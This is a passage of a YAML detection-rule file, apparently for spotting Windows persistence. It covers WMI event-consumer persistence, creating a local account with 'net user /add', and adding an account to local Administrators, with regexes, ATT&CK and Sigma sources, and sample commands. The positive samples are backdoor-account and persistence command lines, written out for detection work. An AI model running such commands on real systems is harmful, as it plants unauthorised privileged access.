      - 'Set-WmiInstance -Namespace root\subscription -Class ActiveScriptEventConsumer -Arguments @{Name="upd";ScriptingEngine="VBScript";ScriptText="..."}'
    negative:
      - 'Get-WmiObject -Namespace root\subscription -Class __EventFilter'
      - 'Get-CimInstance Win32_Service | Where-Object State -eq Running'

- id: mention.persist.net_user_add
  title: Local account created with net user /add
  match:
    anchored: 'net user [^\n]{1,100}/add\b'
  case_sensitive: false
  strength: medium
  attack: [T1136.001]
  telemetry: [windows_text]
  source:
    name: 'SigmaHQ: New User Created Via Net.EXE (Endgame, JHasenbusch, oscd.community)'
    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_net_user_add.yml
    license: DRL-1.1
    upstream_id: cd219ff3-fa99-45d4-8380-a7d15116c6dc
  rationale: >-
    Creating a local account from the command line is a backdoor-account step; help desks also do it, so it is medium
    as upstream. The account name and the next step (added to Administrators) decide.
  examples:
    positive:
      - 'net user support_tmp P@ssw0rd123! /add'
    negative:
      - 'net user alice /domain'
      - 'net use Z: \\fileserver\share /persistent:no'

- id: mention.persist.local_admins_add
  title: Account added to the local Administrators group
  match:
    anchored: 'localgroup {1,3}administrators {1,3}[^\n]{1,80}/add\b'
  case_sensitive: false
  strength: medium
  attack: [T1098]
  telemetry: [windows_text]
  source:
    name: MITRE ATT&CK Enterprise 20.0, T1098 Account Manipulation
    url: https://attack.mitre.org/techniques/T1098
    license: MITRE ATT&CK Terms of Use (royalty-free, copyright notice retained)
    upstream_id: T1098
  rationale: >-
    Granting local admin from the command line follows backdoor-account creation; desktop support does it too, so it
    is medium.
  examples:
    positive:
      - 'net localgroup administrators support_tmp /add'
    negative:
      - 'net localgroup administrators'
      - 'net localgroup "Remote Desktop Users"'
